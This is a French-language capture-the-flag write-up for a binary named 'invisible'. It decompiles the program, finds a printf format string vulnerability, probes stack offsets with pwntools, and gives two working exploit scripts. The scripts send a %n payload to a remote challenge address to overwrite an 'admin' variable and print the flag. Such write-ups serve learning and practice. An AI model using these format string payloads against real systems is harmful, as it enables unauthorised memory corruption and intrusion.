on regarde le type de fichier `file invisible` (c'est du binaire)
`strings invisble` ne donne rien.
`chmod +x invsible` pour rendre le fichier éxecutable.

**déssemblage sur https://dogbolt.org**

fonction main et print_flag:

``` C
//----- (0000000000401186) ----------------------------------------------------
int print_flag()
{
  return system("cat /home/ecowas/flag");
}

//----- (000000000040119C) ----------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char s[140]; // [rsp+10h] [rbp-90h] BYREF
  int v6; // [rsp+9Ch] [rbp-4h]

  v3 = time(0LL);
  srand(v3);
  v6 = rand() % 50;
  memset(s, 0, 0x80uLL);
  fgets(s, 128, stdin);
  printf(s);
  if ( v6 == 27 )
  {
    if ( admin == 200 )
      print_flag();
  }
  else
  {
    printf("Try again");
  }
  return 0;
}
```

donc, pour le défi, quelques faits que nous pouvons lire à partir du binaire :
- pas de PIE, donc toutes les adresses sont fixes, sympa
- la variable admin est à une adresse constante, vous pouvez trouver cela facilement avec un désassembleur ou un décompilateur
- le rng est amorcé avec srand(time(NULL)), ce qui signifie l'heure actuelle en secondes
- cela signifie que chaque seconde vous obtenez une nouvelle valeur aléatoire
- la valeur aléatoire v6 % 50 doit être 27, donc environ toutes les 50 tentatives, elle sera correcte sans que nous fassions quoi que ce soit.
- donc la seule chose que nous devons faire est d'écraser `admin` à `200`.

- *Nous avons trouvé quelque chose d'intéressant: `print(s)` c'est à dire que notre input sera affiché d'abord.* Voyons celà   
<img text="test1" src=/screenshots/test1.png">
Sound interesting ;-) .
Testons le **Format string vulnerability**  [article:](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b):
![[formatstring.png]]
Gooooddddd !!! nous avons des addresses du stack.

- **Allons plus loin**: Où est stocké notre input?
```python
from pwn import *


for i in range(10):
    p = process(["./invisible"])
    p.sendline(f"AAAAAAAA %{i}$lx") # i représente l'argument
    print(i, p.readline(1024))
    p.close()
    print("\n")
```

l'argument 8 afficher notre input en  `hex`:
![[arg8.png]]

Maintenant on cherche l'adresse de la fonction `admin`:
![[adminfunc.png]]

Cherchons notre padding entre le format string et l'addresse:
addresse `%8$n`  commence à l'octet 0
addresse `%9$n` à l'octet 8
addresse `%10$n` à l'octet 16

**Exploitation**
shellcode= `%200c%10$nXXXXXX\x5c\x40\x40\x00\x00\x00\x00\x00`
%200c%10$n : on écrit 200 dans l'argument 10
XXXXXX: ne signifie rien, on peut le remplacer par des espaces ou null bytes
\x5c\x40\x40\x00\x00\x00\x00\x00 : l'adresse de l'admin en `Little endian`

exploit 1: Simple mais il faut taper entrée à chaque fois pour avancer
```python
from pwn import *

for i in range(51):
    r = remote("51.38.37.81", 1234)
    r.sendline(b"%200c%10$nXXXXXX\x5c\x40\x40\x00\x00\x00\x00\x00")
    r.interactive()
```

exploit 2: automatisé
```python
from pwn import *
import sys
import time


context.log_level = "error"

binary = ELF("./invisible")
admin_addr = binary.symbols["admin"]
print(f"&admin = {hex(admin_addr)}")

for i in range(100):
    r =remote("51.38.37.81", 1234) 

    fmtstr = b"%200c%11$n%25$016lx\0\0\0\0\0"
    assert len(fmtstr) == 24
    fmtstr += p64(admin_addr)

    r.sendline(fmtstr)

    data = r.readall()
    data2 = data[200:] # remove garbage
    try:
        rand = int(data2[0:8].decode(), 16)
        text = data2[16:].decode()
        print(f"i = {i}, rand = {rand}, text = {text}")

        if rand == 27:
            print("this should have been the flag, maybe admin isn't correctly overwritten?")
            break
    except Exception:
        print(data) # print whole line, probably flag
        break

    time.sleep(1)
```

THAT'S IT !!!!!!!!!!!!!!!!!!!!!!!!!!!! ;-)
